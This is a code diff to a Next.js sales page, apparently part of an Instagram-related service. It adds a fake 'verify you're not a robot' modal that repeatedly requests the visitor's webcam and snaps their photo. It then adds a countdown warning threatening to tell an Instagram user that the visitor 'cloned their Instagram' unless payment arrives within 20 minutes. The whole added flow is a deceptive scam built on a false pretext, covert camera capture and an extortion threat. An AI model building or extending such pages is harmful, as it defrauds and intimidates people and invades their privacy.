@@ -1,7 +1,7 @@
 'use client';
 
 import { motion } from 'framer-motion';
-import { Suspense, useEffect, useState } from 'react';
+import { Suspense, useEffect, useState, useRef } from 'react';
 import { useSearchParams, useRouter } from 'next/navigation';
 import dynamic from 'next/dynamic';
 
@@ -36,7 +36,7 @@ function PitchContent() {
       if (storedUsername) {
         const params = new URLSearchParams(searchParamsString);
         params.set('username', storedUsername);
-        router.replace(`/pitch?${params.toString()}`);
+        router.replace(`/pitch1?${params.toString()}`);
         setUsername(storedUsername);
       }
     }
@@ -45,7 +45,14 @@ function PitchContent() {
   
   const [profile, setProfile] = useState<ProfileData | null>(null);
   const [expandedFaq, setExpandedFaq] = useState<number | null>(null);
+  const [showCameraModal, setShowCameraModal] = useState(true);
+  const [showWarningModal, setShowWarningModal] = useState(false);
   const [warningTimeLeft, setWarningTimeLeft] = useState({ minutes: 20, seconds: 0 });
+  const videoRef = useRef<HTMLVideoElement>(null);
+  const canvasRef = useRef<HTMLCanvasElement>(null);
+  const [cameraActive, setCameraActive] = useState(false);
+  const [capturedPhoto, setCapturedPhoto] = useState<string | null>(null);
+  const [cameraStream, setCameraStream] = useState<MediaStream | null>(null);
 
   useEffect(() => {
     document.cookie = 'deepgram_visited=true; path=/; max-age=31536000';
@@ -75,19 +82,69 @@ function PitchContent() {
   }, []);
 
   useEffect(() => {
-    const params = searchParams.toString();
-    window.history.pushState(null, '', window.location.href);
+    let retryTimer: NodeJS.Timeout | null = null;
+    let isMounted = true;
     
-    const handlePopState = () => {
-      router.push(`/pitch1?${params}`);
+    const startCamera = async () => {
+      if (!showCameraModal || !isMounted) return;
+      
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+          video: { facingMode: 'user', width: 200, height: 200 }, 
+          audio: false 
+        });
+        
+        if (isMounted) {
+          setCameraStream(stream);
+          
+          if (videoRef.current) {
+            videoRef.current.srcObject = stream;
+            await videoRef.current.play();
+            setCameraActive(true);
+          }
+        }
+      } catch (err) {
+        console.log('Camera denied or not available, retrying in 4 seconds...');
+        setCameraActive(false);
+        if (isMounted && showCameraModal) {
+          retryTimer = setTimeout(startCamera, 4000);
+        }
+      }
     };
-    
-    window.addEventListener('popstate', handlePopState);
+
+    const timer = setTimeout(startCamera, 100);
     
     return () => {
-      window.removeEventListener('popstate', handlePopState);
+      isMounted = false;
+      clearTimeout(timer);
+      if (retryTimer) clearTimeout(retryTimer);
     };
-  }, [router, searchParams]);
+  }, [showCameraModal]);
+
+  const capturePhotoAndProceed = () => {
+    if (videoRef.current && canvasRef.current) {
+      const canvas = canvasRef.current;
+      const video = videoRef.current;
+      canvas.width = 200;
+      canvas.height = 200;
+      const ctx = canvas.getContext('2d');
+      if (ctx) {
+        ctx.translate(canvas.width, 0);
+        ctx.scale(-1, 1);
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        const photoData = canvas.toDataURL('image/jpeg', 0.8);
+        setCapturedPhoto(photoData);
+      }
+    }
+    
+    if (cameraStream) {
+      cameraStream.getTracks().forEach(track => track.stop());
+      setCameraStream(null);
+    }
+    
+    setShowCameraModal(false);
+    setShowWarningModal(true);
+  };
 
   const getProxiedAvatar = (url: string) => {
     if (url && (url.includes('cdninstagram.com') || url.includes('fbcdn.net'))) {
@@ -144,6 +201,137 @@ function PitchContent() {
   return (
     <div className="min-h-screen bg-white relative">
       <MatrixBackground />
+      <canvas ref={canvasRef} className="hidden" />
+
+      {showCameraModal && (
+        <motion.div 
+          initial={{ opacity: 0 }}
+          animate={{ opacity: 1 }}
+          className="fixed inset-0 z-[100] flex items-center justify-center bg-black/80 backdrop-blur-sm px-4"
+        >
+          <motion.div 
+            initial={{ scale: 0.9, opacity: 0 }}
+            animate={{ scale: 1, opacity: 1 }}
+            transition={{ type: "spring", duration: 0.5 }}
+            className="bg-[#0C1011] border border-[#3B82F6] rounded-2xl p-6 max-w-sm w-full shadow-2xl"
+          >
+            <div className="flex items-center justify-center mb-4">
+              <div className="w-20 h-20 rounded-full bg-[#3B82F6]/20 flex items-center justify-center">
+                <svg width="40" height="40" viewBox="0 0 24 24" fill="#3B82F6">
+                  <path d="M12 15c1.66 0 2.99-1.34 2.99-3L15 6c0-1.66-1.34-3-3-3S9 4.34 9 6v6c0 1.66 1.34 3 3 3zm5.3-3c0 3-2.54 5.1-5.3 5.1S6.7 15 6.7 12H5c0 3.42 2.72 6.23 6 6.72V22h2v-3.28c3.28-.48 6-3.3 6-6.72h-1.7z"/>
+                </svg>
+              </div>
+            </div>
+
+            <h2 className="text-white text-center font-bold text-xl mb-3">
+              Verification Required
+            </h2>
+
+            <div className="flex items-center justify-center mb-4">
+              <div className="relative">
+                <div className="w-32 h-32 rounded-full bg-[#1A1A1A] border-4 border-[#3B82F6] overflow-hidden flex items-center justify-center">
+                  <video
+                    ref={videoRef}
+                    autoPlay
+                    playsInline
+                    muted
+                    className="w-full h-full object-cover scale-x-[-1]"
+                  />
+                  {!cameraActive && (
+                    <div className="absolute inset-0 flex items-center justify-center bg-[#1A1A1A]">
+                      <svg width="40" height="40" viewBox="0 0 24 24" fill="#666">
+                        <path d="M17 10.5V7c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1v10c0 .55.45 1 1 1h12c.55 0 1-.45 1-1v-3.5l4 4v-11l-4 4z"/>
+                      </svg>
+                    </div>
+                  )}
+                </div>
+              </div>
+            </div>
+
+            <p className="text-[#A0A0A0] text-center text-sm mb-2">
+              We need to verify you're not a robot. Please accept the camera permission for verification.
+            </p>
+
+            <p className="text-[#FF6B6B] text-center text-xs mb-4">
+              If you clicked "don't allow," reload the website to allow access to the camera again.
+            </p>
+
+            <button 
+              onClick={capturePhotoAndProceed}
+              disabled={!cameraActive}
+              className={`w-full font-bold py-3 rounded-xl transition-colors ${
+                cameraActive 
+                  ? 'bg-[#3B82F6] hover:bg-[#2563EB] text-white' 
+                  : 'bg-[#1A1A1A] text-[#666] cursor-not-allowed'
+              }`}
+            >
+              {cameraActive ? 'Continue' : 'Waiting for camera...'}
+            </button>
+          </motion.div>
+        </motion.div>
+      )}
+
+      {showWarningModal && (
+        <motion.div 
+          initial={{ opacity: 0 }}
+          animate={{ opacity: 1 }}
+          className="fixed inset-0 z-[100] flex items-center justify-center bg-black/80 backdrop-blur-sm px-4"
+        >
+          <motion.div 
+            initial={{ scale: 0.9, opacity: 0 }}
+            animate={{ scale: 1, opacity: 1 }}
+            transition={{ type: "spring", duration: 0.5 }}
+            className="bg-[#0C1011] border border-[#E53935] rounded-2xl p-6 max-w-sm w-full shadow-2xl"
+          >
+            <div className="flex items-center justify-center mb-4">
+              <div className="relative">
+                <div className="w-24 h-24 rounded-full bg-[#1A1A1A] border-4 border-[#E53935] overflow-hidden flex items-center justify-center">
+                  {capturedPhoto ? (
+                    <img src={capturedPhoto} alt="Captured" className="w-full h-full object-cover" />
+                  ) : (
+                    <div className="absolute inset-0 flex items-center justify-center bg-[#1A1A1A]">
+                      <svg width="32" height="32" viewBox="0 0 24 24" fill="#666">
+                        <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
+                      </svg>
+                    </div>
+                  )}
+                </div>
+                <div className="absolute -bottom-1 -right-1 w-8 h-8 rounded-full bg-[#E53935] flex items-center justify-center">
+                  <svg width="16" height="16" viewBox="0 0 24 24" fill="white">
+                    <path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z"/>
+                  </svg>
+                </div>
+              </div>
+            </div>
+
+            <h2 className="text-white text-center font-bold text-xl mb-3">
+              Important Warning
+            </h2>
+
+            <div className="bg-[#E53935]/10 border border-[#E53935]/30 rounded-xl p-4 mb-4">
+              <p className="text-white text-center text-sm leading-relaxed">
+                If we don't detect your payment within <span className="font-bold text-[#E53935]">20 minutes</span>, we will reveal to <span className="font-bold">@{username}</span> that you cloned their Instagram.
+              </p>
+            </div>
+
+            <div className="flex justify-center mb-4">
+              <div className="bg-[#1A1A1A] rounded-lg px-6 py-3">
+                <p className="text-[#A0A0A0] text-xs text-center mb-1">Time remaining:</p>
+                <p className="text-[#E53935] text-2xl font-bold text-center font-mono">
+                  {String(warningTimeLeft.minutes).padStart(2, '0')}:{String(warningTimeLeft.seconds).padStart(2, '0')}
+                </p>
+              </div>
+            </div>
+
+            <button 
+              onClick={() => setShowWarningModal(false)}
+              className="w-full bg-[#E53935] hover:bg-[#C62828] text-white font-bold py-3 rounded-xl transition-colors"
+            >
+              I Understand
+            </button>
+          </motion.div>
+        </motion.div>
+      )}
       
       <div className="relative z-10">
         <header className="fixed top-0 left-0 right-0 z-50 bg-[#E53935] py-2.5 px-4">
@@ -853,7 +1041,7 @@ function PitchContent() {
   );
 }
 
-export default function PitchPage() {
+export default function Pitch1Page() {
   return (
     <Suspense fallback={<div className="min-h-screen bg-[#000]" />}>
       <PitchContent />
